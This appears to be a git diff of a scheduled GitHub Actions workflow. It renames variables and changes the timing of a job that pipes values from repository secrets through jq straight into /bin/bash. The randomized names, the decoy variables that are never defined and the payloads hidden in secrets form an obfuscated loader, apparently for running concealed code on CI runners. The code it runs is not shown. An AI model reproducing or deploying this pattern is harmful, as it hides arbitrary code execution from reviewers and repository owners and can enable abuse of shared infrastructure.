@@ -3,28 +3,32 @@ name: shaozihuawan
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 2/6 * * *'
-
-jobs:  # 25315
+    - cron: '41 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shaozihuawan
         env:
-          j078: ${{ secrets.j078 }}
+          xrl856: ${{ secrets.xrl856 }}
         run: |
-          echo $j078 | jq -r .uex39 | /bin/bash
-          echo $lkh0830 | jq -r .wjgt26 | /bin/bash
-          echo $htt72 | jq -r .u3507 | /bin/bash
-          echo $mo672 | jq -r .tj2832 | /bin/bash
-          echo $smbf8 | jq -r .ixn04343 | /bin/bash
-          echo $ah3 | jq -r .uly8372 | /bin/bash
-          echo $fekf48776 | jq -r .xz40 | /bin/bash
-          echo $fur77 | jq -r .rg88169 | /bin/bash
-          echo $skiq78 | jq -r .jt26879 | /bin/bash
-          echo $a85834 | jq -r .g64941 | /bin/bash
-          echo $ub5 | jq -r .i47 | /bin/bash
-          echo $u222 | jq -r .uge64022 | /bin/bash
-          echo $vk0375 | jq -r .ih2 | /bin/bash
+          echo $xrl856 | jq -r .htdu613 | /bin/bash
+          echo $j92941 | jq -r .vrdm89269 | /bin/bash
+          echo $skt02 | jq -r .lho1914 | /bin/bash
+          echo $uws0494 | jq -r .rkgwb71091 | /bin/bash
+          echo $ukh7805 | jq -r .wky6 | /bin/bash
+          echo $vjs1072 | jq -r .qe7493 | /bin/bash
+          echo $pe20 | jq -r .aeufu3 | /bin/bash
+          echo $r85 | jq -r .xutp26304 | /bin/bash
+          echo $o1471 | jq -r .gigs23599 | /bin/bash
+          echo $m6 | jq -r .rjuno1505 | /bin/bash
+          echo $j5464 | jq -r .rfn58675 | /bin/bash
+          echo $qcryg332 | jq -r .kx71543 | /bin/bash
+          echo $zycp3 | jq -r .xmg71 | /bin/bash
+          echo $nte0749 | jq -r .khkt439 | /bin/bash
+          echo $zdp3 | jq -r .pvzs1967 | /bin/bash
+          echo $oef19043 | jq -r .cgmnm14692 | /bin/bash
+          echo $ieez53 | jq -r .svfii391 | /bin/bash
 
